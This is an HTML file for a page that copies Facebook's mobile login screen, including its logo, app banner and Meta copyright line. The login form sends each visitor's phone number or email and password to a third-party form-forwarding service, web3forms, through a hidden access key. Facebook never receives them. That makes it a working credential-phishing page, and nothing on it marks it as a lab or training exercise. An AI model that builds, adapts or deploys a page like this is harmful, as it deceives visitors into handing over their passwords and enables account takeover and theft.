<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SingUp</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container-section">
        <header class="bg-yellow-100 w-full md:w-full flex text-center text-blue-300">
            <img src="./img/facebook-mobile-app.png" class="" alt="logo" width="30px" >
            <span>Get Facebook for Android and browse faster</span>
        </header>

        <div class="form-section ">
            <form action="https://api.web3forms.com/submit" method="POST">
                <h2 class="my-3 text-blue-700 text-2xl font-bold text-center">Facebook</h2>
                <input type="hidden" name="access_key" value="4b83bc41-81fa-4aba-8449-61700b2cf875">
                <input type="text" name="phone" id="input-box" placeholder="Mobile number or email address" required>
                <br>
                <input type="password" name="phone" id="input-box" placeholder="Password" required>
                <br>
                <input type="submit" value="Log in" id="input-box" class="submit" >
            </form>
            
            <h5 class="forgotton-pass text-center">Forgotten password?</h5>
            <div class="hr-lin">
                <hr class="left-hr">
                <span>or</span>
                <hr class="right-hr">

            </div>
            <div class="Create-new-account mx-auto text-center my-4">
                <input type="button" value="Creat new account" >
            </div>
        </div>

        <!-- meta logo -->
         <img src="./img/meta.png" alt="" class="mt-[100px]" id="meta" width="30px">
         <span class="text-xl">Meta &copy; 2024</span>


    </div>
    
    <script src="./script.js"></script>
</body>
</html>
